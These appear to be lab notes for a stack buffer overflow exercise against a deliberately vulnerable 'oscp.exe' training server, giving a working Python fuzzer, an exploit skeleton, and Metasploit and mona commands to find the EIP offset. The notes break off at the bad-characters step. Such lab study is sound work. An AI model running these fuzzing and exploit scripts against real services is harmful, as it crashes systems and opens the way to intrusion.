


---

1. Mona Configuration

- The mona script has been preinstalled, however to make it easier to work with, you should configure a working folder using the following command, which you can run in the command input box at the bottom of the Immunity Debugger window:

    - `!mona config -set workingfolder c:\mona\%p`

---

2. Fuzzing

    - The fuzzer will send increasingly long strings comprised of `A`. 
    
    - If the fuzzer crashes the server with one of the strings, the fuzzer should exit with an error message. 
    
    - Make a note of the largest number of bytes that were sent.

- `python_fuzzing.py` (chmod +x)

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.56.134"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

- `python3_fuzzer.py`

---

3. Crash Replication & Controlling EIP

- Run the following command to generate a cyclic pattern of a length `400 bytes` longer ([Ax100,Ax100]:200+400) that the string that crashed the server (change the -l value to this):

    - `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600` 

- Copy the output and place it into the payload variable of the `exploit.py` script. 

- Create:

    - `python_exploit.py` (chmod +x)

```
import socket

ip = "10.10.56.134"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

- The script should crash the `oscp.exe` server again. 

- This time, in `Immunity Debugger`, in the **command input box at the bottom of the screen**, run the following **mona command**, changing the distance to the same length as the pattern you created:

    - `!mona findmsp -distance 600`
    
- Mona should display a log window with the output of the command. 

    - If not, click the `Window` menu and then `Log data` to view it (choose "CPU" to switch back to the standard view).

- In this output you should see a line which states:

    - `EIP contains normal pattern : ... (offset XXXX)` 
    
1. Update your `exploit.py` script and set the `offset` variable to this value **(was previously set to 0)**. 

2. Set the `payload` variable to an **empty string again**. 

3. Set the `retn` variable to `BBBB`.

4. Restart `oscp.exe` in `Immunity Debugger` and run the modified `python_exploit.py` script again. 

    - The `EIP` register should now be overwritten with the 4 B's **(BBBB)** `42424242`. 

---  

4. Finding Bad Characters
